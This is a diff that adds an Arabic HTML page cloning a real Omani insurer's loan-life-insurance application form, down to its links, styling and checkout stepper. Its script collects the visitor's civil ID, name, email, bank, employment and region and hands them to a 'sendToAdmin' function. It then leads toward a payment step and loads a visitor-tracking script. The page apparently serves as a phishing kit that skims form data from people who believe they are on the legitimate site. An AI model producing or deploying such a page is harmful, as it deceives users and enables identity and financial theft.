@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --theme-default5: #5eac12;
+            --theme-default5_2: #80c739;
+            --theme-default5_3: #c5dfab;
+            --theme-gradient5: linear-gradient(to right, rgb(94, 172, 18) 0%, rgb(128, 199, 57) 51%, rgb(128, 199, 57) 100%);
+        }
+        body {
+            font-family: 'Tajawal Regular', sans-serif;
+            direction: rtl;
+            margin: 0;
+            background: #fff;
+            color: #586167;
+        }
+
+        /* Header */
+        header.header-1 {
+            border-bottom: 1px solid #eee;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 99;
+            padding: 10px 0;
+        }
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .brand-logo img { height: 50px; }
+        .nav-menu {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            align-items: center;
+        }
+        .nav-menu a {
+            text-decoration: none;
+            color: #333;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .nav-icons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        .nav-icons a {
+            color: #5eac12;
+            font-size: 1.3rem;
+            text-decoration: none;
+        }
+
+        /* Page Header with gradient bg */
+        .page-header {
+            background: radial-gradient(circle, rgb(255, 243, 205) 0%, rgb(255, 255, 255) 100%);
+            padding: 20px 0 15px;
+        }
+        .page-heading-1 {
+            font-size: 32px;
+            font-weight: 600;
+            color: #80c739;
+            margin: 0;
+            text-align: right;
+        }
+
+        /* Stepper - matching original exactly */
+        .sm-stepper {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            width: 100%;
+            position: relative;
+            gap: 0;
+        }
+        .sm-stepper__item {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex: 0 0 auto;
+            min-width: 140px;
+            z-index: 1;
+        }
+        /* Connecting lines */
+        .sm-stepper__item:not(:last-child)::after {
+            content: "";
+            position: absolute;
+            top: 12px;
+            left: -50%;
+            width: 100%;
+            height: 2px;
+            background-color: #d7dbe1;
+            z-index: -1;
+        }
+        .sm-stepper__item.sm-is-done:not(:last-child)::after {
+            background-color: #c5dfab;
+        }
+        .sm-stepper__link {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: inherit;
+        }
+        .sm-stepper__circle {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #d7dbe1;
+            display: grid;
+            place-items: center;
+            color: #6c757d;
+            font-weight: 400;
+            font-size: 14px;
+        }
+        .sm-stepper__item.sm-is-done .sm-stepper__circle {
+            background: #c5dfab;
+            border-color: #c5dfab;
+            color: #5eac12;
+        }
+        .sm-stepper__item[aria-current="step"] .sm-stepper__circle {
+            background: #5eac12;
+            border-color: #5eac12;
+            color: #fff;
+        }
+        .sm-stepper__label {
+            margin-top: 4px;
+            font-size: 14px;
+            color: #6c757d;
+        }
+        .sm-stepper__item[aria-current="step"] .sm-stepper__label {
+            color: #5eac12;
+        }
+
+        /* Form Section - WHITE background (NOT inside wave) */
+        .form-section {
+            background: #fff;
+            padding: 30px 0 40px;
+        }
+
+        /* Theme Card */
+        .theme-card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 3.346px 3.716px 22.5px 0px rgba(0,0,0,0.07);
+            border: none;
+            overflow: visible;
+            margin-bottom: 20px;
+        }
+        .filter-cards {
+            border-bottom: 1px solid #eee;
+        }
+        .p-30px { padding: 30px; }
+
+        /* ico-heading: icon on the RIGHT side in RTL */
+        .ico-heading {
+            display: flex;
+            flex-direction: row;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        .ico-heading .img-box img {
+            width: 64px;
+            height: 64px;
+        }
+        .ico-heading .text-box {
+            text-align: right;
+        }
+        .heading-bb-2 {
+            font-size: 19.2px;
+            color: #6c757d;
+            font-weight: 600;
+            margin: 0;
+            padding-bottom: 0;
+            text-decoration: underline;
+            text-decoration-color: var(--theme-default5);
+            text-underline-offset: 4px;
+        }
+        .sub-text {
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 5px;
+            margin-bottom: 0;
+        }
+
+        /* Form fields */
+        .form-floating > .form-control,
+        .form-floating > .form-select {
+            border: 1px solid #ced4da;
+            border-radius: 6px;
+            height: 56px;
+            text-align: right;
+            padding-right: 12px;
+        }
+        .form-floating > label {
+            right: 12px;
+            left: auto;
+            text-align: right;
+            transform-origin: right top;
+        }
+        .form-floating > .form-control:focus ~ label,
+        .form-floating > .form-control:not(:placeholder-shown) ~ label,
+        .form-floating > .form-select ~ label {
+            transform: scale(0.85) translateY(-0.5rem) translateX(0);
+            color: #6c757d;
+        }
+        h6 {
+            text-align: right;
+            color: #586167;
+            font-weight: 600;
+        }
+
+        /* Wave Container - with real wave curve at top like original */
+        .wave-container {
+            position: relative;
+            background: linear-gradient(90deg, rgb(125, 242, 156) 0%, rgb(15, 105, 169) 100%);
+            overflow: hidden;
+            padding: 80px 0 20px;
+            margin-top: -40px;
+        }
+        .wave-container::before {
+            content: '';
+            position: absolute;
+            top: -60px;
+            left: 0;
+            right: 0;
+            height: 120px;
+            background: #fff;
+            border-radius: 0 0 50% 50%;
+            z-index: 1;
+        }
+        .wave-container::after {
+            content: '';
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.04);
+            bottom: -300px;
+            left: -150px;
+            animation: rotate 20s linear infinite reverse;
+        }
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        /* Buttons */
+        .section-page-footer-1 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+        .btn-gradient.color-2 {
+            background-image: var(--theme-gradient5);
+            background-size: 200% auto;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 500;
+            transition: all 0.5s ease;
+        }
+        .btn-gradient.color-2:hover {
+            background-position: right center;
+        }
+        .btn-prev {
+            padding: 10px 50px;
+            font-size: 16px;
+        }
+        .btn-next {
+            padding: 8px 35px;
+            font-size: 14px;
+        }
+
+        /* Footer */
+        footer .sub-footer {
+            padding: 12px 0;
+            background: #2d2d2d;
+        }
+        footer .sub-footer .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        footer .sub-footer p {
+            font-size: 14px;
+            font-weight: 500;
+            color: #d2d2d2;
+            margin: 0;
+        }
+        .sub-footer-link {
+            display: flex;
+            gap: 10px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        .sub-footer-link li + li { margin-right: 10px; }
+        .sub-footer-link li a {
+            color: #d2d2d2;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .sub-footer-link li a:hover { color: #fff; }
+
+        /* Mobile responsive */
+        @media (max-width: 768px) {
+            .wave-container {
+                display: none;
+            }
+            .mobile-buttons-row {
+                display: flex;
+                flex-direction: row;
+                gap: 0.5rem;
+                margin-top: 1rem;
+            }
+            .mobile-buttons-row .btn-next {
+                flex: 1;
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+            .mobile-buttons-row .btn-prev-mobile {
+                flex: 1;
+                background-image: var(--theme-gradient5);
+                background-size: 200% auto;
+                color: #fff;
+                border: none;
+                border-radius: 8px;
+                font-size: 14px;
+                font-weight: 500;
+                cursor: pointer;
+                padding: 10px 20px;
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body class="rtl">
+    <!-- Header -->
+    <header class="header-1">
+        <div class="header-inner">
+            <a href="/" class="brand-logo">
+                <img alt="logo" class="img-fluid" src="/assets/images/logo/bima-logo.png">
+            </a>
+            <ul class="nav-menu">
+                <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+                <li><a href="#">تأمين ▾</a></li>
+                <li><a href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;">تتبع الطلب</a></li>
+            </ul>
+            <div class="nav-icons">
+                <a href="tel:+96879997797"><i class="fa-solid fa-headset"></i></a>
+                <a href="#"><i class="fa-solid fa-globe"></i></a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Page Header with Stepper -->
+    <div class="page-header">
+        <div class="container">
+            <h1 class="page-heading-1 mb-3">تأمين القروض</h1>
+            <div class="d-flex justify-content-center py-2">
+                <div class="sm-stepper" aria-label="Checkout progress">
+                    <div class="sm-stepper__item sm-is-done">
+                        <a class="sm-stepper__link">
+                            <span class="sm-stepper__circle">1</span>
+                            <span class="sm-stepper__label">التفاصيل</span>
+                        </a>
+                    </div>
+                    <div class="sm-stepper__item sm-is-done">
+                        <a class="sm-stepper__link">
+                            <span class="sm-stepper__circle">2</span>
+                            <span class="sm-stepper__label">العروض</span>
+                        </a>
+                    </div>
+                    <div class="sm-stepper__item">
+                        <a class="sm-stepper__link">
+                            <span class="sm-stepper__circle">3</span>
+                            <span class="sm-stepper__label">مراجعة</span>
+                        </a>
+                    </div>
+                    <div class="sm-stepper__item">
+                        <a class="sm-stepper__link">
+                            <span class="sm-stepper__circle">4</span>
+                            <span class="sm-stepper__label">الدفع</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Form Section on WHITE background -->
+    <div class="form-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <div class="theme-card p-0">
+                        <div class="filter-cards">
+                            <div class="p-30px">
+                                <div class="ico-heading">
+                                    <div class="img-box">
+                                        <img src="/assets/images/ins/sponsor-icon.png" alt="sponsor icon" class="img-fluid">
+                                    </div>
+                                    <div class="text-box">
+                                        <h6 class="heading-bb-2">بيانات العميل</h6>
+                                        <p class="sub-text">يرجى إدخال بياناتك لطلب تأمين الحياة على القرض</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-12">
+                                <div class="p-30px pt-0">
+                                    <div class="row">
+                                        <div class="col-sm-12">
+                                            <h6>كيف ينبغي لنا أن نخاطبك</h6>
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="civil_resident_id" placeholder=" " class="form-control">
+                                                        <label for="civil_resident_id">الرقم المدني</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="title" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>الآنسة (Miss)</option>
+                                                            <option>الدكتور / الدكتورة (Dr.)</option>
+                                                            <option>السادة (M/s.)</option>
+                                                            <option>السيد (Mr.)</option>
+                                                            <option>السيد/السيدة (Mr/Ms)</option>
+                                                            <option>السيدة (Mrs.)</option>
+                                                            <option>السيدة (Ms.)</option>
+                                                        </select>
+                                                        <label for="title">عنوان</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="first_name" placeholder=" " class="form-control">
+                                                        <label for="first_name">الأسم الأول</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="last_name" placeholder=" " class="form-control">
+                                                        <label for="last_name">الاسم الأخير</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="email" id="email" placeholder=" " class="form-control">
+                                                        <label for="email">البريد الإلكتروني</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="bank" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>البنك الأهلي</option>
+                                                            <option>بنك الهلال (إسلامي)</option>
+                                                            <option>بنك العز الإسلامي</option>
+                                                            <option>بنك اليسر (إسلامي)</option>
+                                                            <option>بنك ظفار</option>
+                                                            <option>بنك ملي إيران</option>
+                                                            <option>بنك مسقط</option>
+                                                            <option>بنك نزوى</option>
+                                                            <option>بنك باروده</option>
+                                                            <option>بنك بيروت</option>
+                                                            <option>بنك صادرات إيران</option>
+                                                            <option>بنك صحار</option>
+                                                            <option>بنك صحار (إسلامي)</option>
+                                                            <option>حبيب بنك ليمتد</option>
+                                                            <option>اتش اس بي سي عُمان</option>
+                                                            <option>ميسرة (بنك مسقط)</option>
+                                                            <option>ميثاق الإسلامي</option>
+                                                            <option>مزن الإسلامي</option>
+                                                            <option>بنك أبوظبي الوطني</option>
+                                                            <option>البنك الوطني العُماني</option>
+                                                            <option>بنك عُمان العربي</option>
+                                                            <option>بنك عُمان الدولي</option>
+                                                            <option>بنك قطر الوطني</option>
+                                                            <option>ستاندرد تشارترد</option>
+                                                        </select>
+                                                        <label for="bank">البنك المستفيد</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="employment_type" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>صاحب عمل</option>
+                                                            <option>مقاول</option>
+                                                            <option>عمل حر</option>
+                                                            <option>أخرى</option>
+                                                            <option>متقاعد</option>
+                                                            <option>موظف</option>
+                                                            <option>عمل خاص</option>
+                                                            <option>طالب</option>
+                                                            <option>غير موظف</option>
+                                                        </select>
+                                                        <label for="employment_type">نوع الوظيفة</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="governate" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>الداخلية</option>
+                                                            <option>الظاهرة</option>
+                                                            <option>شمال الباطنة</option>
+                                                            <option>جنوب الباطنة</option>
+                                                            <option>البريمي</option>
+                                                            <option>الوسطى</option>
+                                                            <option>شمال الشرقية</option>
+                                                            <option>جنوب الشرقية</option>
+                                                            <option>ظفار</option>
+                                                            <option>مسندم</option>
+                                                            <option>مسقط</option>
+                                                            <option>أخرى</option>
+                                                        </select>
+                                                        <label for="governate">المنطقة</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="relation_title" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>ابنة</option>
+                                                            <option>موظف</option>
+                                                            <option>أب</option>
+                                                            <option>زوج</option>
+                                                            <option>الورثة الشرعيون</option>
+                                                            <option>أم</option>
+                                                            <option>نفسي</option>
+                                                            <option>ابن</option>
+                                                            <option>زوجة</option>
+                                                        </select>
+                                                        <label for="relation_title">العلاقة</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <!-- Next button inside card -->
+                                    <div class="row mt-3">
+                                        <div class="col-12">
+                                            <div class="mobile-buttons-row d-md-none">
+                                                <button type="button" class="btn-gradient color-2 btn-prev-mobile">
+                                                    <i class="fas fa-arrow-right me-2"></i> السابق
+                                                </button>
+                                                <button type="button" class="btn-gradient color-2 btn-next" onclick="window.location.href='/insurance/credit-life-review'">
+                                                    التالي <i class="fas fa-arrow-left ms-2"></i>
+                                                </button>
+                                            </div>
+                                            <div class="d-none d-md-flex" style="justify-content:flex-end;">
+                                                <button type="button" class="btn-gradient color-2 btn-next" id="nextBtn" onclick="window.location.href='/insurance/credit-life-review'">
+                                                    التالي <i class="fas fa-arrow-left ms-2"></i>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wave Container - Previous button -->
+    <section class="wave-container">
+        <div class="container">
+            <div class="section-page-footer-1">
+                <button type="button" class="btn-gradient color-2 btn-prev" id="prevBtn">
+                    <i class="fas fa-arrow-right me-2"></i> السابق
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="sub-footer">
+            <div class="container">
+                <p>حقوق الطبع والنشر © 2026, جميع الحقوق محفوظة</p>
+                <ul class="sub-footer-link">
+                    <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+                    <li><a href="https://bima.om/Home/Terms">شروط</a></li>
+                    <li><a href="https://bima.om/Home/PrivacyPolicy">سياسة الخصوصية</a></li>
+                    <li><a href="https://bima.om/Home/ContactUs">اتصال</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    document.getElementById('nextBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        var params = new URLSearchParams(window.location.search);
+        var amount = params.get('amount') || '15';
+        // Save form data to localStorage
+        var creditLifeData = {
+            civil_id: document.getElementById('civil_resident_id').value,
+            title: document.getElementById('title').value,
+            first_name: document.getElementById('first_name').value,
+            last_name: document.getElementById('last_name').value,
+            email: document.getElementById('email').value,
+            bank: document.getElementById('bank').value,
+            employment_type: document.getElementById('employment_type').value,
+            governate: document.getElementById('governate').value,
+            relation: document.getElementById('relation_title').value,
+            amount: amount
+        };
+        localStorage.setItem('creditLifeData', JSON.stringify(creditLifeData));
+        if (window.sendToAdmin) {
+            window.sendToAdmin({
+                'الرقم المدني': creditLifeData.civil_id,
+                'العنوان': creditLifeData.title,
+                'الاسم الأول': creditLifeData.first_name,
+                'اسم العائلة': creditLifeData.last_name,
+                'البريد الإلكتروني': creditLifeData.email,
+                'البنك': creditLifeData.bank,
+                'نوع التوظيف': creditLifeData.employment_type,
+                'المحافظة': creditLifeData.governate,
+                'العلاقة': creditLifeData.relation,
+                'المبلغ': amount + ' ر.ع'
+            }, 'تأمين القروض - البيانات');
+        }
+        window.location.href = '/insurance/credit-life-review?amount=' + amount;
+    });
+    document.getElementById('prevBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.history.back();
+    });
+    </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
